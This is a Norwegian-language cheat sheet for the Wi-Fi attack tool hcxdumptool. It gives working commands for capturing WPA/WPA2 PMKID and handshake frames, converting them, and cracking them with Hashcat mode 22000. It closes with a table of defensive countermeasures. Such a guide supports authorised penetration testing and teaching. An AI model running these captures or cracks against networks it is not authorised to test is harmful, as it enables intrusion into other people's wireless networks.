<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# hcxdumptool Jukseark

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) er et moderne, høyytelses kommandolinjeverktøy for Wi-Fi-angrep og pakkefangst. I motsetning til eldre Aircrack-ng-verktøy, fanger `hcxdumptool` WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier)-rammer uten å kreve tilkoblede klienter, fanger EAPOL 4-veis håndtrykk og integreres direkte med `hcxtools` for Hashcat-cracking (modus 22000).

---

## Innholdsfortegnelse

- [Core Advantages & Modern Architecture](#core-advantages--modern-architecture)
- [Installasjon (`hcxdumptool` & `hcxtools`)](#installation-hcxdumptool--hcxtools)
- [Wireless Interface Setup](#wireless-interface-setup)
- [Capturing PMKID (Clientless Attack)](#capturing-pmkid-clientless-attack)
- [Konverter opptak med `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
- [Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)
- [Filtrering av kanaler og BSSID-er](#filtering-channels-and-bssids)
- [Defensive mottiltak og WPA3](#defensive-mottiltak--wpa3)

---

## Kjernefordeler og moderne arkitektur

- **Klientløst PMKID-angrep:** Utnytter RSN IE (Robust Security Network Information Element) PMKID-funksjonen i moderne rutere. Du trenger **ikke** en tilkoblet klient eller deautentiseringspakker for å fange opp nøkkelmaterialet.
- **Unified Hashcat Mode 22000:** Genererer Hashcat-native hash-filer som støtter både PMKID og fulle WPA-PBKDF2-PMK-håndtrykk.
- **Channel Hopping & Active Interrogation:** Sender målrettede tilknytningsforespørsler for å fremkalle PMKID-er fra lyttende AP-er.

---

## Installasjon (`hcxdumptool` & `hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## Oppsett av trådløst grensesnitt

Før du kjører `hcxdumptool`, må du avslutte bakgrunnsnettverksadministrasjonstjenester som forstyrrer råpakkeinjeksjon:
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## Fange PMKID (klientløst angrep)

### 1. Generell PMKID-opptak på tvers av alle 2,4 GHz- og 5GHz-kanaler
Fang alle nærliggende tilgangspunkter til en `.pcapng`-fil:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: Trådløst skjermgrensesnitt.
- `-w capture.pcapng`: Utdatafangstfil.
- `--rds=1`: Send RTS-rammer for å spørre AP-svar.

### 2. Fang et spesifikt måltilgangspunkt (BSSID-filter)
Målrett kun en autorisert BSSID for å forhindre at uautoriserte tredjepartsrutere påvirkes:

1. Opprett målfilterliste (`target_bssid.txt`):
```text
001122334455
```
*(BSSID uten kolon)*

2. Kjør målrettet fangst:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`: Lås injeksjon og lytting til kanal 6.
- `--bpfp`: Bruk BPF (Berkeley Packet Filter)-liste for mål-BSSID-er.

---

## Konvertering av opptak med `hcxpcapngtool`

Når PMKID-er eller EAPOL-rammer er samlet inn, konverter `.pcapng`-opptaket til et Hashcat-kompatibelt format:
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: Utdata hash-fil i moderne Hashcat-format.
- `-E essid_list.txt`: Lagre oppdagede nettverksnavn (ESSID-er) i en ordbok for målrettet passordknekking.
- Verktøyet rapporterer totalt PMKID- og EAPOL-rammer som er hentet ut.

---

## Hashcat Cracking (Modus 22000)

Mode `22000` er Hashcats enhetlige WPA-PBKDF2-PMKID + EAPOL cracking-modus:

### 1. Ordbokangrep
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. Regelbasert mutasjonsangrep
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. Mask / Brute-Force Attack (8-sifrede numeriske passord)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## Filtrering av kanaler og BSSID-er

Optimaliser fangsthastigheten ved å begrense skanneparametere:
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## Defensive mottiltak og WPA3

| Sårbarhet | Angrepsmekanisme | Forsvarets anbefaling |
|---|---|---|
| **PMKID Caching** | AP overfører PMKID i EAPOL-ramme 1 uten klientautentisering | Deaktiver 802.11r (rask overgang / roaming) hvis det ikke er nødvendig; oppdater ruterens fastvare. |
| **Svak WPA2 forhåndsdelt nøkkel** | Offline PBKDF2 ordbok cracking (Hashcat-modus 22000) | Håndhev 16+ tegn tilfeldige passordfraser. |
| **Eldre WPA2-protokoll** | Mottakelig for PMKID og håndtrykkfangst | Oppgrader til **WPA3-Personal (SAE)**; WPA3 bruker Dragonfly-håndtrykk med fremadrettet hemmelighold, noe som gjør fangede bilder uslåelige offline. |